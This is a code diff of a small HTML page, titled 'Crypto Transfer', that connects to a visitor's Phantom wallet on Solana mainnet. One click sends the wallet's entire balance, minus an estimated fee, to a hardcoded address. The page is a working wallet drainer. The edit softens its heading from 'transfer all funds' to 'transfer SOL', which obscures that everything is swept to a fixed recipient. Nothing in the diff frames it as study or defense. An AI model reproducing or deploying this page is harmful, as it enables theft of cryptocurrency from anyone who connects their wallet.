@@ -3,63 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Transfer</title>
+    <title>Crypto Transfer</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 </head>
-<body>
-    <h1>Click below to transfer all funds</h1>
-    <button id="transfer-btn">Transfer Now</button>
+<body style="background-color: #f8f4e1; text-align: center; padding: 50px;">
+    <h1>Click below to transfer SOL</h1>
+    <button onclick="initiateTransfer()">Transfer Now</button>
 
     <script>
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-        const recipientPublicKey = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
+        // Constants
+        const recipientAddress = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
 
-        document.getElementById('transfer-btn').addEventListener('click', async () => {
+        async function initiateTransfer() {
             try {
+                // Check if Phantom wallet is installed
                 if (!window.solana || !window.solana.isPhantom) {
-                    alert('Please install Phantom Wallet');
+                    alert("Phantom wallet not found. Please install it.");
                     return;
                 }
 
-                // Connect to Phantom Wallet
-                const provider = window.solana;
-                await provider.connect();
-                const wallet = provider.publicKey;
+                // Connect to the Phantom wallet
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                const wallet = window.solana;
+                const response = await wallet.connect();
 
-                // Get balance
-                const balance = await connection.getBalance(wallet);
-                if (balance <= 0) {
-                    alert('Insufficient balance');
+                alert("Connected to wallet: " + response.publicKey.toString());
+
+                // Get the wallet's public key
+                const senderPublicKey = new solanaWeb3.PublicKey(response.publicKey);
+
+                // Fetch wallet balance
+                let balance = await connection.getBalance(senderPublicKey);
+                let balanceInSOL = balance / solanaWeb3.LAMPORTS_PER_SOL;
+                console.log(`Wallet balance: ${balanceInSOL} SOL`);
+
+                if (balanceInSOL <= 0) {
+                    alert("Insufficient balance to perform the transfer.");
                     return;
                 }
 
-                // Calculate amount to send (subtracting transaction fee)
-                const LAMPORTS_PER_SOL = solanaWeb3.LAMPORTS_PER_SOL;
-                const fee = 5000; // Approximate fee
-                const amountToSend = balance - fee;
-
-                // Create transaction
+                // Calculate transaction fee
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: wallet,
-                        toPubkey: recipientPublicKey,
-                        lamports: amountToSend
+                        fromPubkey: senderPublicKey,
+                        toPubkey: new solanaWeb3.PublicKey(recipientAddress),
+                        lamports: balance - (5000)  // Adjust 5000 lamports as estimated fee
                     })
                 );
 
-                transaction.feePayer = wallet;
-                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+                // Request transaction signature from Phantom wallet
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = senderPublicKey;
 
-                // Sign and send transaction
-                const signedTransaction = await provider.signTransaction(transaction);
+                const signedTransaction = await wallet.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-                await connection.confirmTransaction(signature);
 
-                alert('Transaction successful! Signature: ' + signature);
+                alert("Transaction sent! Signature: " + signature);
+
+                // Confirm the transaction
+                await connection.confirmTransaction(signature, 'confirmed');
+                alert("Transaction confirmed! Funds transferred successfully.");
             } catch (error) {
-                alert('Transaction failed: ' + error.message);
+                console.error("Transaction failed:", error);
+                alert("Transaction failed: " + error.message);
             }
-        });
+        }
     </script>
 </body>
 </html>
